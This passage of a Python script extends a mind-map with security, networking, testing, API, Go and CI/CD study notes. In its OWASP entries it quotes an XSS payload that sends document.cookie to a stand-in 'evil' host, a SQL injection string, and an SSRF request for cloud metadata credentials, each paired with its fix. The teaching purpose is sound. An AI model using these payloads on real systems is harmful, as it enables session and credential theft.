#!/usr/bin/env python3
"""One-shot expansion: add 6 new root branches to public/mindmap.json
and populate every new leaf with a Definition / Trade-offs / Application
Example detail child, in the same format as scripts/add_details.py.

New roots: Security, Networking fundamentals, Testing strategies,
API design, Golang, CI/CD.

Idempotent: if a top-level node with the same title already exists, the
script skips it. Existing trees are not mutated.
"""
from __future__ import annotations

import json
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
JSON_PATH = ROOT / "public" / "mindmap.json"


def detail_title(definition: str, trade_offs: str, application: str) -> str:
    return (
        f"**Definition:** {definition}<br/>"
        f"**Trade-offs:** {trade_offs}<br/>"
        f"**Application Example:** {application}"
    )


# ─── Structural definition of the 6 new roots ────────────────────────────────
# Each root is a dict; leaves are dicts with only {"title": ...}; internal
# nodes have a `note` for section context. After we append, a walker adds
# the Detail child to every leaf using DETAILS below.

NEW_ROOTS: list[dict] = [
    {
        "title": "Security",
        "note": "Defending the system across the auth, network, data, code, and operational planes.",
        "children": [
            {
                "title": "Authentication",
                "note": "Proving **who** the caller is.",
                "children": [
                    {"title": "Sessions (cookie-based)"},
                    {"title": "JWT (stateless tokens)"},
                    {"title": "OAuth 2.0 / OIDC"},
                    {"title": "API keys"},
                    {"title": "Multi-factor authentication (TOTP, WebAuthn / passkeys)"},
                    {"title": "Single Sign-On (SAML, OIDC)"},
                    {"title": "Password storage (bcrypt, argon2, scrypt)"},
                ],
            },
            {
                "title": "Authorization",
                "note": "Deciding **what** the caller is allowed to do.",
                "children": [
                    {"title": "RBAC"},
                    {"title": "ABAC"},
                    {"title": "ReBAC (Zanzibar-style)"},
                    {"title": "Policy engines (OPA, Cedar)"},
                ],
            },
            {
                "title": "Server-to-server auth",
                "note": "Identity for non-human callers — cron jobs, services, scripts, deploy pipelines.",
                "children": [
                    {"title": "mTLS"},
                    {"title": "OAuth client credentials"},
                    {"title": "Service accounts (K8s SA, AWS IAM roles, GCP service accounts)"},
                    {"title": "SSH public-key authentication"},
                ],
            },
            {
                "title": "Encryption",
                "note": "Protect data in motion and at rest.",
                "children": [
                    {"title": "In transit (TLS / mTLS)"},
                    {"title": "At rest (KMS, envelope encryption)"},
                    {"title": "Symmetric vs asymmetric"},
                    {"title": "Hashing vs encryption"},
                ],
            },
            {
                "title": "Secrets management",
                "note": "Where credentials live and how they get into the workload that needs them.",
                "children": [
                    {"title": "Vault / AWS Secrets Manager / Doppler"},
                    {"title": "Rotation"},
                    {"title": "OIDC federation in CI"},
                ],
            },
            {
                "title": "OWASP Top 10",
                "note": "The application-level vulnerability classes every senior engineer should recognise on sight.",
                "children": [
                    {"title": "Injection (SQL / command / LDAP)"},
                    {"title": "Broken authentication"},
                    {"title": "XSS"},
                    {"title": "CSRF"},
                    {"title": "SSRF"},
                ],
            },
            {
                "title": "Threat modeling",
                "note": "Structured way to enumerate threats before they become incidents.",
                "children": [
                    {"title": "STRIDE"},
                    {"title": "Attack surface analysis"},
                ],
            },
        ],
    },
    {
        "title": "Networking fundamentals",
        "note": "The TCP/IP stack you have to be fluent in to design distributed systems.",
        "children": [
            {"title": "DNS"},
            {"title": "TCP / UDP"},
            {"title": "TLS"},
            {"title": "HTTP versions"},
            {"title": "Real-time protocols"},
        ],
    },
    {
        "title": "Testing strategies",
        "note": "Layered confidence — fast cheap tests for most code, slow expensive tests for the riskiest paths.",
        "children": [
            {"title": "Test pyramid"},
            {"title": "Unit tests"},
            {"title": "Integration tests"},
            {"title": "Contract tests"},
            {"title": "End-to-end tests"},
            {"title": "Load testing"},
            {"title": "Chaos engineering"},
            {"title": "Test doubles"},
            {"title": "Property-based testing"},
            {"title": "Mutation testing"},
        ],
    },
    {
        "title": "API design",
        "note": "Designing public-facing surfaces that survive years of clients and change.",
        "children": [
            {"title": "REST maturity (Richardson Model)"},
            {"title": "Versioning"},
            {"title": "Idempotency keys"},
            {"title": "Pagination"},
            {"title": "Error contracts"},
            {"title": "Rate-limit headers"},
            {"title": "HATEOAS"},
            {"title": "Schema-first"},
            {"title": "Backward compatibility"},
            {"title": "API Gateway integration"},
        ],
    },
    {
        "title": "Golang",
        "note": "Senior-level Go interview classics — concurrency, the runtime, idioms, and the famous gotchas.",
        "children": [
            {"title": "Concurrency (goroutines, channels, select)"},
            {"title": "Memory model & race detector"},
            {"title": "GC & escape analysis"},
            {"title": "Interfaces & composition"},
            {"title": "Error handling (errors.Is / As / wrapping with %w)"},
            {"title": "Context propagation (cancellation, timeouts, request-scoped values)"},
            {"title": "Testing (table-driven, benchmarks, fuzz)"},
            {"title": "Generics (1.18+)"},
            {"title": "Common gotchas (slice aliasing, defer eval, nil interface vs nil pointer)"},
            {"title": "Standard library staples (net/http, sync.{Mutex,WaitGroup,Pool}, encoding/json)"},
        ],
    },
    {
        "title": "CI/CD",
        "note": "Automating the path from commit to production with safety nets at every step.",
        "children": [
            {"title": "CI fundamentals"},
            {
                "title": "Branching strategies",
                "note": "How code flows from a developer's machine to main.",
                "children": [
                    {"title": "Trunk-based development"},
                    {"title": "GitFlow"},
                    {"title": "GitHub Flow"},
                    {"title": "Release branches"},
                ],
            },
            {
                "title": "Deployment strategies",
                "note": "How a new version takes traffic — risk vs. operational complexity.",
                "children": [
                    {"title": "Recreate"},
                    {"title": "Rolling"},
                    {"title": "Blue / Green"},
                    {"title": "Canary"},
                    {"title": "Shadow / Mirror"},
                    {"title": "Feature flags"},
                ],
            },
            {"title": "Environments"},
            {"title": "Infrastructure as Code"},
            {"title": "GitOps"},
            {"title": "DB migrations"},
            {"title": "Rollback strategies"},
            {"title": "DORA metrics"},
        ],
    },
]


# ─── Detail content for every new leaf, keyed by full path ────────────────
DETAILS: dict[str, tuple[str, str, str]] = {
    # ───────────────── Security > Authentication
    "Security > Authentication > Sessions (cookie-based)": (
        "Stateful auth where the server stores a session record and hands the client an opaque session ID inside an HTTP-only cookie.",
        "Trivial to revoke (delete the row) and naturally CSRF-protected with `SameSite=Lax`, but every API node needs access to the session store, which becomes a hot dependency.",
        "A monolithic web app keeping sessions in Redis with a 24-hour TTL; signing out drops the key and the next request 401s.",
    ),
    "Security > Authentication > JWT (stateless tokens)": (
        "Self-contained signed JSON token (`header.payload.signature`) carrying the user's identity and claims; verified via signature without hitting a session store.",
        "Stateless and great for microservices, but **revocation is hard** — you can't \"log out\" until the token expires, which forces short TTLs and refresh tokens.",
        "An API gateway validating an RS256-signed access token in `Authorization: Bearer …` on every call without a DB lookup.",
    ),
    "Security > Authentication > OAuth 2.0 / OIDC": (
        "OAuth 2.0 is a delegated **authorization** framework; OpenID Connect (OIDC) layers **identity** (an `id_token`) on top.",
        "Standardised flows (authorization code + PKCE for SPAs/mobile, client credentials for service-to-service), but the spec is broad and easy to mis-implement — the wrong flow leaks tokens.",
        "\"Sign in with Google\" using OIDC's authorization code + PKCE flow, returning an `id_token` plus an `access_token` for downstream APIs.",
    ),
    "Security > Authentication > API keys": (
        "Long-lived static secrets a client sends in a header (e.g. `X-API-Key`) to identify itself.",
        "Dead-simple to issue and rotate, but easy to leak (logs, repos, screenshots) and offer no user identity — only \"this caller knows the secret\".",
        "A SaaS platform issuing per-tenant API keys for backend integrations, scoped to a project and revocable from a dashboard.",
    ),
    "Security > Authentication > Multi-factor authentication (TOTP, WebAuthn / passkeys)": (
        "Require a second factor beyond the password — something the user **has** (TOTP app, security key) or **is** (biometric).",
        "Dramatically reduces phishing/credential-stuffing risk, but adds friction and recovery flows to design carefully.",
        "GitHub requiring a TOTP code or WebAuthn passkey on every new device login for accounts contributing to popular open-source repos.",
    ),
    "Security > Authentication > Single Sign-On (SAML, OIDC)": (
        "Enterprise-grade auth where a central Identity Provider (Okta, Azure AD, Google) issues assertions/tokens to multiple downstream apps.",
        "One login across many tools and centralised offboarding, but adds an integration tax and hard-couples uptime to the IdP.",
        "An employee logging into Slack, Notion, and Datadog via Okta SAML — disabling the user in Okta cuts access everywhere.",
    ),
    "Security > Authentication > Password storage (bcrypt, argon2, scrypt)": (
        "Store an **adaptive** hash (bcrypt / argon2 / scrypt) of the password, not the password itself; cost is tuned so a verify takes ~100ms.",
        "Resilient to GPU/ASIC cracking even after a DB leak, at the cost of CPU/memory per login — must tune work factor per hardware.",
        "User signup runs `argon2id(password, salt, t=3, m=64MB, p=1)` and stores the encoded hash; login re-runs the same parameters to compare.",
    ),
    # ───────────────── Security > Authorization
    "Security > Authorization > RBAC": (
        "Role-Based Access Control — assign users to **roles** (admin, editor, viewer) and grant permissions to roles.",
        "Easy to reason about and audit at small scale, but explodes (\"role explosion\") when permissions need to vary by resource, owner, or attribute.",
        "A SaaS app where `admin` can create projects, `editor` can write within their project, and `viewer` can only read — defined in a permissions table per role.",
    ),
    "Security > Authorization > ABAC": (
        "Attribute-Based Access Control — decisions evaluate **attributes** of the user, resource, action, and environment via policies.",
        "Far more expressive than RBAC and avoids role explosion, but harder to reason about and audit — \"who can do X?\" is no longer a simple lookup.",
        "A policy: `allow if user.department == resource.department AND time.hour BETWEEN 9 AND 18`, evaluated by an OPA sidecar on each request.",
    ),
    "Security > Authorization > ReBAC (Zanzibar-style)": (
        "Relationship-Based Access Control — model permissions as graphs of relationships (`user X is owner of folder Y`, `folder Y is parent of file Z`).",
        "Naturally fits social/document/folder hierarchies and scales to billions of relationships, but needs a dedicated service and careful schema design.",
        "Google Drive sharing modeled in Zanzibar: \"can_view(file)\" walks `editor` → `parent_folder` → `editor` relationships transitively.",
    ),
    "Security > Authorization > Policy engines (OPA, Cedar)": (
        "Externalised decision engines that take `(subject, action, resource, context)` and return allow/deny based on declarative policies.",
        "Decouple policy from code so policies can be reviewed and updated independently, but add a network hop and a new component to operate.",
        "An Envoy sidecar consulting OPA on every gRPC call against a Rego policy bundle versioned in Git and pushed via OCI registry.",
    ),
    # ───────────────── Security > Server-to-server auth
    "Security > Server-to-server auth > mTLS": (
        "Mutual TLS — both client AND server present X.509 certificates so each side cryptographically authenticates the other.",
        "Strongest form of pinned identity for service-to-service traffic and impossible to phish, but requires cert lifecycle automation (issuance, rotation, revocation).",
        "Service-mesh sidecars (Istio, Linkerd) automatically issuing short-lived per-pod certs from an internal CA so all in-cluster traffic is mTLS-encrypted and -authenticated.",
    ),
    "Security > Server-to-server auth > OAuth client credentials": (
        "OAuth 2.0 flow for backend-to-backend auth: the client exchanges a `client_id`/`client_secret` for a short-lived access token.",
        "Standardised, scope-aware, and integrates with existing IdPs, but secret distribution is your problem and short tokens require frequent refreshes.",
        "A nightly batch job fetching an access token from Auth0 with `grant_type=client_credentials` and using it to call an internal API.",
    ),
    "Security > Server-to-server auth > Service accounts (K8s SA, AWS IAM roles, GCP service accounts)": (
        "Cloud/platform-native identities attached to a workload — the platform mints short-lived credentials transparently, no static secrets.",
        "Eliminates credential leakage (no secrets to steal) and inherits IAM auditing, but ties the workload tightly to the platform.",
        "A pod with `serviceAccountName: orders-app` getting an IRSA token that lets it `s3:GetObject` on one specific bucket, without any AWS keys in code or env.",
    ),
    "Security > Server-to-server auth > SSH public-key authentication": (
        "Asymmetric auth where a server stores the user's public key and accepts logins signed with the matching private key.",
        "Phishing-proof and easy to revoke (delete the key from `authorized_keys`), but a leaked private key without a passphrase is full compromise.",
        "Engineers SSH'ing into bastion hosts using ed25519 keys whose public part is provisioned via configuration management; passwords are disabled.",
    ),
    # ───────────────── Security > Encryption
    "Security > Encryption > In transit (TLS / mTLS)": (
        "Encrypts data while it travels over the network, defending against passive sniffing and active tampering.",
        "Universal and battle-tested, but cert lifecycle is its own operational discipline and TLS termination location matters (LB vs. pod).",
        "An Application Load Balancer terminating TLS with an ACM cert at the edge and re-encrypting to pods over mTLS via the service mesh.",
    ),
    "Security > Encryption > At rest (KMS, envelope encryption)": (
        "Encrypts data while it sits on disk; the data key encrypts data, and a Key Management Service (KMS) wraps the data key.",
        "Centralises key custody and audit (KMS logs every use), but performance depends on caching the unwrapped key and key rotation needs careful design.",
        "An S3 bucket with SSE-KMS encryption: each object has a unique data key wrapped by `arn:aws:kms:…:keys/…`, decrypt-on-fetch by IAM-authorised callers.",
    ),
    "Security > Encryption > Symmetric vs asymmetric": (
        "**Symmetric:** one shared key used for both encrypt and decrypt (AES). **Asymmetric:** a key pair where the public key encrypts and only the private key decrypts (RSA, ECC).",
        "Symmetric is fast but key distribution is the problem; asymmetric solves distribution but is ~1000× slower — real systems combine both.",
        "TLS handshake uses asymmetric (RSA/ECDHE) to negotiate a shared symmetric session key (AES-GCM), then encrypts the bulk traffic with the symmetric key.",
    ),
    "Security > Encryption > Hashing vs encryption": (
        "**Hashing** is a one-way function producing a fixed-length fingerprint; **encryption** is reversible with the right key.",
        "Hashes can't be undone — perfect for password verification and integrity checks; encryption is for confidentiality of data you'll need back.",
        "Storing `argon2id(password)` in the DB (hash) but encrypting users' API keys with KMS (encrypt) so the support team can re-display them.",
    ),
    # ───────────────── Security > Secrets management
    "Security > Secrets management > Vault / AWS Secrets Manager / Doppler": (
        "Centralised stores that issue, version, and audit secrets; apps fetch them at runtime instead of reading from env vars or files.",
        "One auditable place for credentials with fine-grained access, but the secrets store becomes a Tier-0 dependency that must be HA.",
        "A microservice authenticating to Vault via its K8s service account and fetching a database password that rotates every 24 hours.",
    ),
    "Security > Secrets management > Rotation": (
        "Periodically replacing credentials so a leaked secret has a short useful life.",
        "Drastically shrinks the blast radius of a leak, but rotation must be automated end-to-end — manual rotation creates outages and gets skipped.",
        "AWS RDS IAM-database authentication issuing 15-minute tokens, or Vault's database secrets engine creating per-app DB users with TTLs.",
    ),
    "Security > Secrets management > OIDC federation in CI": (
        "CI runners (GitHub Actions, GitLab) mint a short-lived OIDC token at job start; cloud providers exchange it for temporary IAM credentials based on a trust relationship.",
        "Eliminates long-lived static keys in CI (no more `AWS_SECRET_ACCESS_KEY` repo secret), but requires correct trust-policy setup per repo/branch.",
        "A GitHub Actions deploy job using `aws-actions/configure-aws-credentials` with `role-to-assume` and trust policy gating on `repo:org/repo:ref:refs/heads/main`.",
    ),
    # ───────────────── Security > OWASP Top 10
    "Security > OWASP Top 10 > Injection (SQL / command / LDAP)": (
        "Untrusted input concatenated into a query/command and executed by the interpreter (DB, shell, LDAP server).",
        "Catastrophic when exploited (full DB read/write or RCE), but trivially preventable with parameterised queries and input validation.",
        "`SELECT * FROM users WHERE id = '${id}'` allowing `' OR 1=1 --`; the fix is `?`-parameterised queries via the driver.",
    ),
    "Security > OWASP Top 10 > Broken authentication": (
        "Flaws in login, session, or credential handling — predictable session IDs, password reset abuse, missing rate limits, no MFA.",
        "Often invisible until exploited and devastating because it grants account-level access; mitigated by adopting battle-tested IdPs over rolling your own.",
        "An app that returns 200 OK for valid users and 404 for unknown users on `POST /login`, allowing username enumeration before brute-force.",
    ),
    "Security > OWASP Top 10 > XSS": (
        "Cross-Site Scripting — attacker-supplied input rendered into a victim's browser as executable JS, hijacking session/UI in their context.",
        "Common in template/HTML output and dangerous because it bypasses same-origin protections, but a strict CSP + framework auto-escaping kills 99% of cases.",
        "A comment field saving `<img src=x onerror=fetch('//evil/?c='+document.cookie)>` and rendering it raw on the page; the fix is contextual escaping + `Content-Security-Policy: script-src 'self'`.",
    ),
    "Security > OWASP Top 10 > CSRF": (
        "Cross-Site Request Forgery — a malicious site causes a logged-in user's browser to issue authenticated state-changing requests to your app.",
        "Devastating for cookie-auth apps, neutralised by `SameSite=Lax/Strict` cookies plus an anti-CSRF token on state-changing endpoints.",
        "An attacker page submitting `<form action=https://bank.com/transfer method=POST>`; the bank rejects the request because the session cookie is `SameSite=Strict`.",
    ),
    "Security > OWASP Top 10 > SSRF": (
        "Server-Side Request Forgery — the server is tricked into making outbound requests to attacker-chosen URLs (often internal: `169.254.169.254` cloud metadata).",
        "High-impact in cloud environments because metadata endpoints leak credentials, but mitigated by allow-listing outbound destinations and blocking link-local IPs.",
        "An image-resize service fetching `?url=http://169.254.169.254/…` and returning IMDS-stolen IAM credentials; the fix is a strict outbound URL allow-list and IMDSv2.",
    ),
    # ───────────────── Security > Threat modeling
    "Security > Threat modeling > STRIDE": (
        "Acronym for **S**poofing, **T**ampering, **R**epudiation, **I**nformation disclosure, **D**enial of service, **E**levation of privilege — a checklist of threat categories per data-flow boundary.",
        "Forces a systematic look at trust boundaries early in design, but only as good as the model — high-level architectures miss low-level bugs.",
        "A whiteboard data-flow diagram of a checkout flow with each arrow annotated with applicable STRIDE categories and corresponding mitigations.",
    ),
    "Security > Threat modeling > Attack surface analysis": (
        "Enumerate every place an attacker could interact with the system — endpoints, ports, dependencies, supply chain — and quantify risk.",
        "Drives prioritisation (\"reduce surface\" → fewer exposed endpoints), but the surface drifts every deploy so the analysis must be continuous.",
        "An ASM tool inventorying all external-facing endpoints across cloud accounts weekly and flagging newly-exposed admin panels or unauthenticated services.",
    ),
    # ───────────────── Networking fundamentals
    "Networking fundamentals > DNS": (
        "Distributed name-resolution system mapping human-readable names (`api.example.com`) to IPs and other records (MX, TXT, SRV).",
        "Hierarchical and aggressively cached for low-latency lookups, but TTLs make changes propagate slowly and DNS is a notorious source of subtle outages.",
        "A multi-region deployment using Route 53 latency-based routing to send each user's `api.example.com` query to the nearest healthy regional ALB, with a 60-second TTL.",
    ),
    "Networking fundamentals > TCP / UDP": (
        "**TCP:** reliable, ordered, connection-oriented stream with congestion control; **UDP:** best-effort, unordered, connectionless datagrams.",
        "TCP is the default for correctness, but its retransmits and head-of-line blocking are bad for real-time and bursty traffic — UDP wins when you'd rather drop than wait.",
        "HTTP/1.1 and HTTP/2 ride TCP; HTTP/3, QUIC, DNS, and most VoIP/video conferencing ride UDP for the latency win.",
    ),
    "Networking fundamentals > TLS": (
        "Transport Layer Security — encrypted, authenticated channel over TCP using certificates and a session-key handshake.",
        "Defends against passive sniffing and active MITM, but cert lifecycle and protocol versions are a constant source of operational pain.",
        "A modern web service serving HTTPS using TLS 1.3 (one-RTT handshake), an ECDSA cert from Let's Encrypt rotated by `cert-manager`, and ALPN-negotiated HTTP/2.",
    ),
    "Networking fundamentals > HTTP versions": (
        "**HTTP/1.1:** plain-text, one request per connection; **HTTP/2:** binary, multiplexed over one TCP connection (HPACK header compression); **HTTP/3:** HTTP/2 semantics over QUIC (UDP).",
        "Each version trades complexity for fewer round-trips and better head-of-line behaviour — HTTP/3 finally fixes TCP HoL blocking but isn't supported everywhere.",
        "An API serving HTTP/2 between LB and origin (multiplexed gRPC), with HTTP/3 enabled at the edge for clients on mobile networks where QUIC's recovery is fastest.",
    ),
    "Networking fundamentals > Real-time protocols": (
        "Bidirectional or push-style protocols for live data: **WebSockets** (full-duplex over TCP), **SSE** (server-push over HTTP), **long-polling** (held-open HTTP request), **WebRTC** (P2P audio/video/data over UDP).",
        "Each fits a different latency/complexity sweet spot — WebSockets for chat and collaboration, SSE for one-way streams (notifications), WebRTC for media.",
        "A collaborative editor using WebSockets for cursor positions and edits, SSE for low-priority notifications, and WebRTC for an in-app video call between collaborators.",
    ),
    # ───────────────── Testing strategies
    "Testing strategies > Test pyramid": (
        "Cohn's hierarchy: lots of fast unit tests → fewer integration tests → very few end-to-end tests, with cost and flakiness rising as you go up.",
        "Optimises feedback time by catching most bugs at the cheapest layer, but only works if the layers below are actually exercising the right behaviour.",
        "A microservice with 5,000 unit tests (run in 8s), 200 integration tests against a real Postgres in CI (3 min), and 20 critical-path e2e tests on a staging URL (10 min).",
    ),
    "Testing strategies > Unit tests": (
        "Tests one function/class in isolation, mocking or stubbing collaborators.",
        "Fast and pinpoint failures, but heavy mocking can lock the test to the implementation and hide refactoring opportunities.",
        "A `formatCurrency(amount, locale)` test asserting outputs for 12 locale combinations, finishing in milliseconds with no I/O.",
    ),
    "Testing strategies > Integration tests": (
        "Tests several real components together — service + DB, service + queue — with as little mocking as possible.",
        "Catches contract mismatches and SQL/migration bugs that unit tests miss, at the cost of slower runs and more flake from environment setup.",
        "Spinning up Postgres via Testcontainers and running the order-creation HTTP handler against the real schema, asserting both response and resulting rows.",
    ),
    "Testing strategies > Contract tests": (
        "Consumer-driven contracts where the client publishes its expectations as a contract and the provider verifies against it in CI.",
        "Catches breaking API changes before deploy without a flaky e2e environment, but requires both teams to adopt the tooling and discipline.",
        "Pact: the `web` consumer publishes its expected `/orders` contract; the `orders-service` CI replays it and fails the build if the response shape regresses.",
    ),
    "Testing strategies > End-to-end tests": (
        "Drive the full stack — real browser, real backend, real DB — to verify user flows.",
        "The closest test to actual user experience, but slow, flaky, and expensive to maintain — keep the suite small and focused on critical paths.",
        "A Playwright test running on a staging URL that signs up, creates a project, invites a teammate, and asserts the welcome email arrives.",
    ),
    "Testing strategies > Load testing": (
        "Synthetic-traffic generation that exercises the system at expected and peak load to measure latency, throughput, and saturation points.",
        "Surfaces capacity limits and bottlenecks before users do, but realistic load scenarios (think distributions, not RPS averages) are hard to design.",
        "A k6 script ramping to 5,000 RPS with realistic user-journey distributions, run pre-Black-Friday against a production-sized staging environment.",
    ),
    "Testing strategies > Chaos engineering": (
        "Deliberately inject faults — kill pods, drop packets, throttle CPU — in production-like environments to verify the system survives.",
        "Builds genuine confidence in resilience, but requires solid observability and a culture that tolerates the surprises chaos uncovers.",
        "Netflix Chaos Monkey randomly terminating EC2 instances during business hours; Gremlin / Litmus injecting CPU/network faults into K8s clusters on a schedule.",
    ),
    "Testing strategies > Test doubles": (
        "Stand-ins for real collaborators in tests: **mock** (verifies calls), **stub** (returns canned responses), **fake** (working in-memory implementation), **spy** (records calls).",
        "Critical for fast deterministic tests, but overuse couples tests to implementation — refactors go red despite behaviour being unchanged.",
        "Replacing the SMTP client with a fake that records every send-attempt in memory; the test asserts a `WelcomeEmail` was queued without touching real email infrastructure.",
    ),
    "Testing strategies > Property-based testing": (
        "Frameworks generate random inputs and shrink failing cases; you assert **invariants** (\"output is always sorted\", \"encode→decode is identity\") instead of fixed examples.",
        "Finds bugs example-based tests miss (edge cases at type boundaries), but requires expressing invariants — not always obvious for business logic.",
        "Hypothesis (Python) or fast-check (TS) generating arbitrary lists and asserting `sorted(reverse(sorted(xs))) == sorted(xs)` to find subtle comparator bugs.",
    ),
    "Testing strategies > Mutation testing": (
        "A tool mutates the production code (flips `>` to `<`, removes statements) and re-runs the test suite; surviving mutants reveal **gaps** in the tests.",
        "Measures test **quality**, not just coverage, but slow (re-runs the suite hundreds of times) and noisy (some mutants are equivalent).",
        "Stryker (JS/TS) running once per release in CI; surviving mutants in the payment-engine module trigger a quality-gate failure until tests are tightened.",
    ),
    # ───────────────── API design
    "API design > REST maturity (Richardson Model)": (
        "Four-level model: **L0** RPC over HTTP, **L1** resources, **L2** HTTP verbs/status codes, **L3** hypermedia (HATEOAS).",
        "Higher levels are more discoverable and cacheable, but most production APIs sit at L2 — L3 adoption is rare in practice.",
        "A REST API exposing `/orders/{id}` (resource), using `POST /orders` and `GET /orders/{id}` correctly with `201 Created` and `Location` headers (L2).",
    ),
    "API design > Versioning": (
        "Strategy for evolving an API without breaking existing clients — URL path (`/v1/`), header (`Accept: application/vnd.api.v2+json`), or content negotiation.",
        "URL versioning is most discoverable and trivial to route; header versioning keeps URLs stable but is invisible to caches and humans.",
        "Stripe pinning each merchant to a versioned API release and rolling out new versions with full changelogs and migration guides.",
    ),
    "API design > Idempotency keys": (
        "Client-supplied unique key (header `Idempotency-Key`) that the server uses to deduplicate retried writes.",
        "Makes at-least-once delivery safe, but the server must persist the key + response for some retention window — extra storage and deduplication logic.",
        "`POST /payments` with `Idempotency-Key: 8a7…` so a network blip during checkout doesn't double-charge the customer; the server returns the original response on retry.",
    ),
    "API design > Pagination": (
        "**Offset:** `?page=2&size=50`; **cursor/keyset:** `?after=ulid…&size=50`; **limit/offset on indexed columns** as a middle ground.",
        "Offset is intuitive but breaks at large offsets (slow scans, items shifting); cursor/keyset is stable and fast but harder to jump to arbitrary pages.",
        "A timeline endpoint paginating with `?after_id=…&limit=50` so newly-inserted items don't shift older items into duplicated/skipped pages.",
    ),
    "API design > Error contracts": (
        "Structured error responses, ideally **RFC 7807 Problem Details** — `type`, `title`, `status`, `detail`, `instance` — instead of free-form strings.",
        "Lets clients reliably handle errors and translate them, but only valuable if the team disciplines itself to use the same structure everywhere.",
        "Returning `application/problem+json` with `{ \"type\": \"...\", \"title\": \"Insufficient funds\", \"status\": 422, \"balance\": 0.50 }` from a payments API.",
    ),
    "API design > Rate-limit headers": (
        "Standard response headers (`X-RateLimit-Limit`, `X-RateLimit-Remaining`, `X-RateLimit-Reset`) plus `Retry-After` on `429`.",
        "Lets well-behaved clients self-throttle without retry storms, but headers are advisory — the server must still enforce.",
        "An API returning `429 Too Many Requests` with `Retry-After: 30` and `X-RateLimit-Reset: 1714…`; SDKs back off automatically using these headers.",
    ),
    "API design > HATEOAS": (
        "Hypermedia As The Engine Of Application State — responses embed links describing what actions the client can take next.",
        "Self-describing and theoretically decouples client from URLs, but adoption is rare because most clients hard-code routes anyway.",
        "An order response embedding `{ \"_links\": { \"cancel\": { \"href\": \"/orders/123/cancel\" }, \"refund\": { \"href\": \"…\" } } }` so clients only follow links they're authorised for.",
    ),
    "API design > Schema-first": (
        "Define the wire contract in a schema (OpenAPI for REST, Protobuf for gRPC) and generate clients/servers/docs from it.",
        "Single source of truth for the API and codegen across many languages, at the cost of a schema-as-code workflow that some teams find heavy.",
        "An internal API defined in `.proto` files, generating Go and TypeScript clients via `buf generate`; SDK changes are driven by schema PRs.",
    ),
    "API design > Backward compatibility": (
        "Evolve the API by **adding** never **removing** — new optional fields, parallel endpoints, deprecation periods.",
        "Lets old clients keep working while new clients adopt new shapes; the cost is supporting more variants and a discipline of additive change.",
        "Adding `currency` as an optional field on a `Money` object with a default; older clients ignore it, newer clients require it — old responses still parse.",
    ),
    "API design > API Gateway integration": (
        "Cross-cutting concerns — auth, rate-limit, routing, request shaping — handled at a single edge component instead of in every service.",
        "Centralises a lot of policy and shields services from clients, but is itself a critical hop and can fragment if every team owns its own gateway.",
        "Kong / AWS API Gateway terminating TLS, validating JWTs, and routing `/orders/*` to the orders service — services receive only authenticated, rate-limited traffic.",
    ),
    # ───────────────── Golang
    "Golang > Concurrency (goroutines, channels, select)": (
        "Lightweight user-space threads (goroutines) communicating via typed pipes (channels), composed with `select` for fan-in/timeouts. \"Don't communicate by sharing memory; share memory by communicating.\"",
        "Cheap to spawn (10s of thousands routine) and easy to reason about per-goroutine, but easy to leak goroutines or deadlock on unbuffered channels.",
        "A worker pool: producer → buffered channel → N consumer goroutines, all cancellable through a shared `context.Context` passed via a `select` arm.",
    ),
    "Golang > Memory model & race detector": (
        "Go's memory model defines a `happens-before` relationship; without explicit synchronisation, reads can see stale writes. The `-race` flag instruments code to detect concurrent access.",
        "Race detector catches the worst class of concurrency bugs in test, but adds 5-10× CPU overhead and only flags races that actually fire.",
        "`go test -race ./…` in CI for every PR, plus `go run -race` on staging during a soak test to surface intermittent races before prod.",
    ),
    "Golang > GC & escape analysis": (
        "Go has a concurrent, tri-color, mark-sweep GC tuned for low pause times (sub-millisecond). The compiler's escape analysis decides whether a value lives on the stack or heap.",
        "Generally invisible and great for productivity, but heap allocations add GC pressure — high-throughput services use `sync.Pool` and watch `go tool pprof` to keep allocations low.",
        "`go build -gcflags='-m'` to see what escapes to the heap; using `bytes.Buffer` from `sync.Pool` in a hot HTTP handler to avoid per-request allocation.",
    ),
    "Golang > Interfaces & composition": (
        "Interfaces are satisfied **structurally** (no `implements` keyword); composition via embedding replaces inheritance.",
        "Tiny interfaces (`io.Reader`, `error`) compose cleanly across the ecosystem, but accidental satisfaction can surprise — and \"interface bloat\" near the call site is a smell.",
        "`func process(r io.Reader) error` accepting any `Read`-er — files, network, in-memory buffers — without knowing or caring about the concrete type.",
    ),
    "Golang > Error handling (errors.Is / As / wrapping with %w)": (
        "Errors are explicit return values. Wrap with `fmt.Errorf(\"…: %w\", err)`; introspect with `errors.Is(err, target)` and `errors.As(err, &target)` for typed checks.",
        "Forces caller awareness at every boundary (no surprise exceptions), but verbose and easy to lose context if you don't wrap.",
        "`if errors.Is(err, sql.ErrNoRows) { return notFound() }` after wrapping the original DB error with operation context up the stack.",
    ),
    "Golang > Context propagation (cancellation, timeouts, request-scoped values)": (
        "`context.Context` flows as the **first parameter** through every blocking call, carrying cancellation, deadlines, and request-scoped values.",
        "Universal cancellation across goroutines and clean timeout semantics, at the cost of `context.Context` polluting nearly every signature.",
        "An HTTP handler creating `ctx, cancel := context.WithTimeout(r.Context(), 2*time.Second)` and passing `ctx` to DB and downstream calls so they all abort if the client disconnects.",
    ),
    "Golang > Testing (table-driven, benchmarks, fuzz)": (
        "Built-in `testing` package: table-driven tests with `t.Run`, microbenchmarks with `b.N`, native fuzzing with `testing.F` since 1.18.",
        "Zero-dependency, fast, and ergonomic for almost everything, but assertion libraries (Testify) are usually added once tests get complex.",
        "Table-driven `TestParse` with 30 cases via `for _, tc := range tests { t.Run(tc.name, func(t *testing.T) {…}) }`, plus `FuzzParse` with seed corpus for the same parser.",
    ),
    "Golang > Generics (1.18+)": (
        "Type parameters on functions and types: `func Map[T, U any](xs []T, f func(T) U) []U`.",
        "Solves real boilerplate around containers and helpers, but Go's generics are deliberately limited (no specialisation, no operator overloading).",
        "A generic `slices.Filter[T any](s []T, keep func(T) bool) []T` replacing four near-identical filter functions for different concrete types.",
    ),
    "Golang > Common gotchas (slice aliasing, defer eval, nil interface vs nil pointer)": (
        "Slice headers share underlying arrays (`s[1:3]` aliases `s`); `defer` evaluates **arguments** at the defer line, not at execution; a non-nil interface holding a nil pointer is **not nil** in `==`.",
        "Idiomatic Go relies on these — appending to a sub-slice can clobber the parent — but they trip every newcomer at least once.",
        "`var err *MyError = nil; var e error = err; e == nil // false` — the classic interview question that catches almost everyone the first time.",
    ),
    "Golang > Standard library staples (net/http, sync.{Mutex,WaitGroup,Pool}, encoding/json)": (
